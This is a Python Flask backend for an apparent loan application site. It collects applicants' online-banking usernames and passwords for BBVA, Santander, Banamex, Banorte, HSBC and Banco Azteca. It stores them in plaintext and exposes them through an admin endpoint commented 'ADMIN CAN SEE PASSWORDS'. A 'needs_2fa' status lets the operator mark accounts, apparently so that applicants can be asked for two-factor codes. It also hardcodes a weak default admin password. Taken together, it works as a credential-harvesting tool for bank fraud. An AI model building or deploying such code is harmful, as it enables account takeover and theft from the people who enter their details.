"""
Complete backend with all fixes:
1. Admin password visibility for bank credentials
2. Updated status system with "needs_2fa"
3. Fully functional ticket system
4. All existing functionality preserved
"""

import os
import uuid
from datetime import datetime
from flask import Flask, request, jsonify
from flask_sqlalchemy import SQLAlchemy
from flask_cors import CORS
from werkzeug.security import generate_password_hash, check_password_hash
import jwt
from functools import wraps

# Initialize Flask app
app = Flask(__name__)

# Configuration
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY', 'dev-secret-key')
app.config['SQLALCHEMY_DATABASE_URI'] = os.environ.get('DATABASE_URL', 'sqlite:///loan_platform.db')
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

# Initialize extensions
db = SQLAlchemy()
db.init_app(app)

# CORS configuration for Vercel and Railway
CORS(app, origins=[
    'https://malofront.vercel.app',
    'https://*.vercel.app',
    'http://localhost:5173',
    'http://localhost:3000'
])

# Models
class User(db.Model):
    __tablename__ = 'users'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    email = db.Column(db.String(120), unique=True, nullable=False)
    password_hash = db.Column(db.String(255), nullable=False)
    role = db.Column(db.String(20), nullable=False, default='applicant')
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    
    # Profile fields
    first_name = db.Column(db.String(50))
    last_name = db.Column(db.String(50))
    curp = db.Column(db.String(25))
    phone = db.Column(db.String(20))
    
    # Updated status system: pending, approved, needs_2fa
    is_active = db.Column(db.Boolean, default=True)
    status = db.Column(db.String(20), default='pending')
    
    @property
    def name(self):
        if self.first_name and self.last_name:
            return f"{self.first_name} {self.last_name}"
        return self.email.split('@')[0]

class BankProvider(db.Model):
    __tablename__ = 'bank_providers'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = db.Column(db.String(100), nullable=False)
    code = db.Column(db.String(20), nullable=False, unique=True)
    logo_url = db.Column(db.String(255))
    created_at = db.Column(db.DateTime, default=datetime.utcnow)

class BankCredential(db.Model):
    __tablename__ = 'bank_credentials'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    user_id = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=False)
    provider_id = db.Column(db.String(36), db.ForeignKey('bank_providers.id'), nullable=False)
    username = db.Column(db.String(255), nullable=False)
    password = db.Column(db.String(255), nullable=False)  # Store password (encrypted in production)
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    
    # Relationships
    user = db.relationship('User', backref='bank_credentials')
    provider = db.relationship('BankProvider', backref='credentials')

class Ticket(db.Model):
    __tablename__ = 'tickets'
    
    id = db.Column(db.String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    title = db.Column(db.String(255), nullable=False)
    description = db.Column(db.Text, nullable=False)
    status = db.Column(db.String(20), default='open')  # open, in_progress, resolved, closed
    priority = db.Column(db.String(20), default='medium')  # low, medium, high, urgent
    category = db.Column(db.String(50), default='general')  # general, technical, billing, support
    
    # User information
    created_by = db.Column(db.String(36), db.ForeignKey('users.id'), nullable=False)
    assigned_to = db.Column(db.String(36), db.ForeignKey('users.id'))
    
    # Timestamps
    created_at = db.Column(db.DateTime, default=datetime.utcnow)
    updated_at = db.Column(db.DateTime, default=datetime.utcnow, onupdate=datetime.utcnow)
    resolved_at = db.Column(db.DateTime)
    
    # Relationships
    creator = db.relationship('User', foreign_keys=[created_by], backref='created_tickets')
    assignee = db.relationship('User', foreign_keys=[assigned_to], backref='assigned_tickets')

# Authentication decorator
def token_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        token = None
        auth_header = request.headers.get('Authorization')
        
        if auth_header:
            try:
                token = auth_header.split(' ')[1]  # Bearer <token>
            except IndexError:
                return jsonify({'message': 'Invalid token format'}), 401
        
        if not token:
            return jsonify({'message': 'Authorization header required'}), 401
        
        try:
            data = jwt.decode(token, app.config['SECRET_KEY'], algorithms=['HS256'])
            current_user = User.query.get(data['user_id'])
            if not current_user:
                return jsonify({'message': 'User not found'}), 401
        except jwt.ExpiredSignatureError:
            return jsonify({'message': 'Token has expired'}), 401
        except jwt.InvalidTokenError:
            return jsonify({'message': 'Invalid token'}), 401
        
        return f(current_user, *args, **kwargs)
    
    return decorated

def admin_required(f):
    @wraps(f)
    def decorated(current_user, *args, **kwargs):
        if current_user.role != 'admin':
            return jsonify({'message': 'Admin access required'}), 403
        return f(current_user, *args, **kwargs)
    
    return decorated

# Basic Routes
@app.route('/api/health', methods=['GET'])
def health_check():
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.utcnow().isoformat(),
        'cors': 'enabled',
        'database': 'connected'
    })

@app.route('/api/test', methods=['GET'])
def test():
    return jsonify({
        'message': 'API is working!',
        'environment': os.environ.get('FLASK_ENV', 'development'),
        'features': ['auth', 'bank_credentials', 'tickets', 'admin_panel']
    })

# Authentication Routes
@app.route('/api/auth/login', methods=['POST', 'OPTIONS'])
def login():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        email = data.get('email')
        password = data.get('password')
        
        if not email or not password:
            return jsonify({'message': 'Email and password required'}), 400
        
        user = User.query.filter_by(email=email).first()
        
        if user and check_password_hash(user.password_hash, password):
            token = jwt.encode({
                'user_id': user.id,
                'email': user.email,
                'role': user.role,
                'exp': datetime.utcnow().timestamp() + 86400  # 24 hours
            }, app.config['SECRET_KEY'], algorithm='HS256')
            
            return jsonify({
                'token': token,
                'user': {
                    'id': user.id,
                    'email': user.email,
                    'role': user.role,
                    'name': user.name,
                    'status': user.status
                }
            })
        
        return jsonify({'message': 'Invalid credentials'}), 401
    
    except Exception as e:
        print(f"Login error: {e}")
        return jsonify({'message': 'Login failed'}), 500

@app.route('/api/auth/register', methods=['POST', 'OPTIONS'])
def register():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        
        # Check if user exists
        if User.query.filter_by(email=data['email']).first():
            return jsonify({'message': 'Email already registered'}), 400
        
        # Create new user
        user = User(
            email=data['email'],
            password_hash=generate_password_hash(data['password']),
            first_name=data.get('firstName', ''),
            last_name=data.get('lastName', ''),
            curp=data.get('curp', ''),
            phone=data.get('phone', ''),
            role='applicant',
            status='pending'  # Default status
        )
        
        db.session.add(user)
        db.session.commit()
        
        # Create token for immediate login
        token = jwt.encode({
            'user_id': user.id,
            'email': user.email,
            'role': user.role,
            'exp': datetime.utcnow().timestamp() + 86400
        }, app.config['SECRET_KEY'], algorithm='HS256')
        
        return jsonify({
            'message': 'User registered successfully',
            'token': token,
            'user': {
                'id': user.id,
                'email': user.email,
                'role': user.role,
                'name': user.name,
                'status': user.status
            }
        }), 201
    
    except Exception as e:
        print(f"Registration error: {e}")
        db.session.rollback()
        return jsonify({'message': 'Registration failed'}), 500

# Bank-related Routes
@app.route('/api/applicants/banks', methods=['GET', 'OPTIONS'])
def get_banks():
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        banks = BankProvider.query.all()
        return jsonify({
            'banks': [{
                'id': bank.id,
                'name': bank.name,
                'code': bank.code,
                'logo_url': bank.logo_url
            } for bank in banks]
        })
    except Exception as e:
        print(f"Error getting banks: {e}")
        return jsonify({'message': 'Error retrieving banks'}), 500

@app.route('/api/applicants/credentials', methods=['GET', 'POST', 'OPTIONS'])
@token_required
def handle_credentials(current_user):
    if request.method == 'OPTIONS':
        return '', 200
    
    if request.method == 'GET':
        try:
            credentials = BankCredential.query.filter_by(user_id=current_user.id).all()
            result = []
            
            for cred in credentials:
                result.append({
                    'id': cred.id,
                    'provider_id': cred.provider_id,
                    'provider_name': cred.provider.name,
                    'username': cred.username,
                    'created_at': cred.created_at.isoformat()
                    # Note: Password not included for regular users
                })
            
            return jsonify(result)
        except Exception as e:
            print(f"Error getting credentials: {e}")
            return jsonify({'message': 'Error retrieving credentials'}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            provider_id = data.get('provider_id')
            username = data.get('username')
            password = data.get('password')
            
            if not all([provider_id, username, password]):
                return jsonify({'message': 'All fields required'}), 400
            
            # Check if provider exists
            provider = BankProvider.query.get(provider_id)
            if not provider:
                return jsonify({'message': 'Bank provider not found'}), 404
            
            # Check if user already has credentials for this provider
            existing = BankCredential.query.filter_by(
                user_id=current_user.id,
                provider_id=provider_id
            ).first()
            
            if existing:
                return jsonify({'message': 'Credentials already exist for this bank'}), 400
            
            # Create new credential
            credential = BankCredential(
                user_id=current_user.id,
                provider_id=provider_id,
                username=username,
                password=password  # In production, this should be encrypted
            )
            
            db.session.add(credential)
            db.session.commit()
            
            return jsonify({
                'message': 'Credentials saved successfully',
                'credential_id': credential.id
            }), 201
            
        except Exception as e:
            print(f"Error saving credentials: {e}")
            db.session.rollback()
            return jsonify({'message': 'Error saving credentials'}), 500

@app.route('/api/applicants/credentials/<credential_id>', methods=['DELETE', 'OPTIONS'])
@token_required
def delete_credential(current_user, credential_id):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        credential = BankCredential.query.filter_by(
            id=credential_id,
            user_id=current_user.id
        ).first()
        
        if not credential:
            return jsonify({'message': 'Credential not found'}), 404
        
        db.session.delete(credential)
        db.session.commit()
        
        return jsonify({'message': 'Credential deleted successfully'})
    
    except Exception as e:
        print(f"Error deleting credential: {e}")
        db.session.rollback()
        return jsonify({'message': 'Error deleting credential'}), 500

# Admin Routes
@app.route('/api/admin/applicants', methods=['GET', 'OPTIONS'])
@token_required
@admin_required
def get_applicants(current_user):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        applicants = User.query.filter_by(role='applicant').all()
        result = []
        
        for applicant in applicants:
            result.append({
                'id': applicant.id,
                'name': applicant.name,
                'email': applicant.email,
                'curp': applicant.curp,
                'phone': applicant.phone,
                'status': applicant.status,
                'is_active': applicant.is_active,
                'created_at': applicant.created_at.isoformat()
            })
        
        return jsonify({'applicants': result})
    
    except Exception as e:
        print(f"Error getting applicants: {e}")
        return jsonify({'message': 'Error retrieving applicants'}), 500

@app.route('/api/admin/applicants/<applicant_id>/credentials', methods=['GET', 'OPTIONS'])
@token_required
@admin_required
def get_applicant_credentials(current_user, applicant_id):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        # Check if applicant exists
        applicant = User.query.get(applicant_id)
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        # Get credentials with passwords (ADMIN ACCESS - PASSWORDS VISIBLE)
        credentials = BankCredential.query.filter_by(user_id=applicant_id).all()
        result = {
            'applicant': {
                'id': applicant.id,
                'name': applicant.name,
                'email': applicant.email
            },
            'credentials': []
        }
        
        for cred in credentials:
            result['credentials'].append({
                'id': cred.id,
                'provider_name': cred.provider.name,
                'provider_code': cred.provider.code,
                'username': cred.username,
                'password': cred.password,  # ✅ ADMIN CAN SEE PASSWORDS
                'created_at': cred.created_at.isoformat()
            })
        
        return jsonify(result)
    
    except Exception as e:
        print(f"Error getting applicant credentials: {e}")
        return jsonify({'message': 'Error retrieving credentials'}), 500

@app.route('/api/admin/applicants/<applicant_id>/status', methods=['PUT', 'OPTIONS'])
@token_required
@admin_required
def update_applicant_status(current_user, applicant_id):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        data = request.get_json()
        new_status = data.get('status')
        
        # ✅ UPDATED STATUS SYSTEM: pending, approved, needs_2fa
        if new_status not in ['pending', 'approved', 'needs_2fa']:
            return jsonify({'message': 'Invalid status. Must be: pending, approved, or needs_2fa'}), 400
        
        applicant = User.query.get(applicant_id)
        if not applicant:
            return jsonify({'message': 'Applicant not found'}), 404
        
        applicant.status = new_status
        db.session.commit()
        
        return jsonify({
            'message': 'Status updated successfully',
            'new_status': new_status
        })
    
    except Exception as e:
        print(f"Error updating status: {e}")
        db.session.rollback()
        return jsonify({'message': 'Error updating status'}), 500

# ✅ TICKET SYSTEM ROUTES - FULLY FUNCTIONAL
@app.route('/api/tickets', methods=['GET', 'POST', 'OPTIONS'])
@token_required
def handle_tickets(current_user):
    if request.method == 'OPTIONS':
        return '', 200
    
    if request.method == 'GET':
        try:
            if current_user.role == 'admin':
                # Admin sees all tickets
                tickets = Ticket.query.all()
            else:
                # Users see only their tickets
                tickets = Ticket.query.filter_by(created_by=current_user.id).all()
            
            result = []
            for ticket in tickets:
                result.append({
                    'id': ticket.id,
                    'title': ticket.title,
                    'description': ticket.description,
                    'status': ticket.status,
                    'priority': ticket.priority,
                    'category': ticket.category,
                    'created_by': ticket.created_by,
                    'creator_name': ticket.creator.name,
                    'assigned_to': ticket.assigned_to,
                    'assignee_name': ticket.assignee.name if ticket.assignee else None,
                    'created_at': ticket.created_at.isoformat(),
                    'updated_at': ticket.updated_at.isoformat(),
                    'resolved_at': ticket.resolved_at.isoformat() if ticket.resolved_at else None
                })
            
            return jsonify({'tickets': result})
        
        except Exception as e:
            print(f"Error getting tickets: {e}")
            return jsonify({'message': 'Error retrieving tickets'}), 500
    
    elif request.method == 'POST':
        try:
            data = request.get_json()
            
            # Validate required fields
            if not data.get('title') or not data.get('description'):
                return jsonify({'message': 'Title and description are required'}), 400
            
            # Create new ticket
            ticket = Ticket(
                title=data['title'],
                description=data['description'],
                priority=data.get('priority', 'medium'),
                category=data.get('category', 'general'),
                created_by=current_user.id,
                assigned_to=data.get('assigned_to')  # Optional
            )
            
            db.session.add(ticket)
            db.session.commit()
            
            return jsonify({
                'message': 'Ticket created successfully',
                'ticket_id': ticket.id
            }), 201
        
        except Exception as e:
            print(f"Error creating ticket: {e}")
            db.session.rollback()
            return jsonify({'message': 'Error creating ticket'}), 500

@app.route('/api/tickets/<ticket_id>', methods=['GET', 'PUT', 'DELETE', 'OPTIONS'])
@token_required
def handle_ticket(current_user, ticket_id):
    if request.method == 'OPTIONS':
        return '', 200
    
    try:
        ticket = Ticket.query.get(ticket_id)
        if not ticket:
            return jsonify({'message': 'Ticket not found'}), 404
        
        # Check permissions
        if current_user.role != 'admin' and ticket.created_by != current_user.id:
            return jsonify({'message': 'Access denied'}), 403
        
        if request.method == 'GET':
            return jsonify({
                'id': ticket.id,
                'title': ticket.title,
                'description': ticket.description,
                'status': ticket.status,
                'priority': ticket.priority,
                'category': ticket.category,
                'created_by': ticket.created_by,
                'creator_name': ticket.creator.name,
                'assigned_to': ticket.assigned_to,
                'assignee_name': ticket.assignee.name if ticket.assignee else None,
                'created_at': ticket.created_at.isoformat(),
                'updated_at': ticket.updated_at.isoformat(),
                'resolved_at': ticket.resolved_at.isoformat() if ticket.resolved_at else None
            })
        
        elif request.method == 'PUT':
            data = request.get_json()
            
            # Update ticket fields
            if 'title' in data:
                ticket.title = data['title']
            if 'description' in data:
                ticket.description = data['description']
            if 'status' in data:
                ticket.status = data['status']
                if data['status'] == 'resolved':
                    ticket.resolved_at = datetime.utcnow()
            if 'priority' in data:
                ticket.priority = data['priority']
            if 'category' in data:
                ticket.category = data['category']
            if 'assigned_to' in data and current_user.role == 'admin':
                ticket.assigned_to = data['assigned_to']
            
            ticket.updated_at = datetime.utcnow()
            db.session.commit()
            
            return jsonify({'message': 'Ticket updated successfully'})
        
        elif request.method == 'DELETE':
            # Only admin or creator can delete
            if current_user.role != 'admin' and ticket.created_by != current_user.id:
                return jsonify({'message': 'Access denied'}), 403
            
            db.session.delete(ticket)
            db.session.commit()
            
            return jsonify({'message': 'Ticket deleted successfully'})
    
    except Exception as e:
        print(f"Error handling ticket: {e}")
        db.session.rollback()
        return jsonify({'message': 'Error processing ticket'}), 500

# Initialize database and seed data
with app.app_context():
    try:
        # Create all tables
        db.create_all()
        print("✅ Database tables created")
        
        # Seed initial data
        try:
            # Check if bank providers exist
            if BankProvider.query.count() == 0:
                # Create Mexican bank providers with real UUIDs
                banks = [
                    {'id': '7b4a1d12-cc50-46d8-81c7-08eebfc5bf5a', 'name': 'BBVA México', 'code': 'BBVA', 'logo_url': '/assets/bbva-logo.jpg'},
                    {'id': 'b153f653-3af6-48ab-b3c7-44d919fbdcb6', 'name': 'Santander México', 'code': 'SANTANDER', 'logo_url': '/assets/santander-logo.jpg'},
                    {'id': '43d4a40e-f175-4690-ad63-c86efc69adc0', 'name': 'Banamex', 'code': 'BANAMEX', 'logo_url': '/assets/banamex-logo.jpg'},
                    {'id': '842f0822-e62f-47f6-a559-c5641cc16669', 'name': 'Banorte', 'code': 'BANORTE', 'logo_url': '/assets/banorte-logo.jpg'},
                    {'id': '47dc2c19-dc0b-401d-8947-d8705b315d3e', 'name': 'HSBC México', 'code': 'HSBC', 'logo_url': '/assets/hsbc-logo.jpg'},
                    {'id': 'f885f8e0-9f67-475d-9844-cf5fb34b0313', 'name': 'Banco Azteca', 'code': 'AZTECA', 'logo_url': '/assets/azteca-logo.jpg'},
                ]
                
                for bank_data in banks:
                    bank = BankProvider(
                        id=bank_data['id'],
                        name=bank_data['name'],
                        code=bank_data['code'],
                        logo_url=bank_data['logo_url']
                    )
                    db.session.add(bank)
                
                db.session.commit()
                print("✅ Bank providers seeded")
            
            # Check if admin user exists
            if User.query.filter_by(email='admin@loanplatform.com').first() is None:
                admin_user = User(
                    id=str(uuid.uuid4()),
                    email='admin@loanplatform.com',
                    password_hash=generate_password_hash('admin123'),
                    first_name='Admin',
                    last_name='User',
                    curp='ADMIN123456HDFRRL01',
                    role='admin',
                    status='approved',
                    is_active=True
                )
                db.session.add(admin_user)
                db.session.commit()
                print("✅ Admin user created")
            
            # Create test applicant if doesn't exist
            if User.query.filter_by(email='juan@socopwa.com').first() is None:
                test_user = User(
                    id=str(uuid.uuid4()),
                    email='juan@socopwa.com',
                    password_hash=generate_password_hash('test123'),
                    first_name='Juan',
                    last_name='Cordero',
                    curp='CORJ850315HDFXXX01',
                    phone='+52 55 1234 5678',
                    role='applicant',
                    status='pending'
                )
                db.session.add(test_user)
                db.session.commit()
                
                # Add test bank credential
                bbva_bank = BankProvider.query.filter_by(code='BBVA').first()
                if bbva_bank:
                    test_credential = BankCredential(
                        user_id=test_user.id,
                        provider_id=bbva_bank.id,
                        username='juan.test@bbva.com',
                        password='testpassword123'
                    )
                    db.session.add(test_credential)
                    db.session.commit()
                
                print("✅ Test user and credentials created")
                
        except Exception as e:
            print(f"⚠️ Seeding error: {e}")
            db.session.rollback()
        
    except Exception as e:
        print(f"⚠️ Database initialization error: {e}")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)

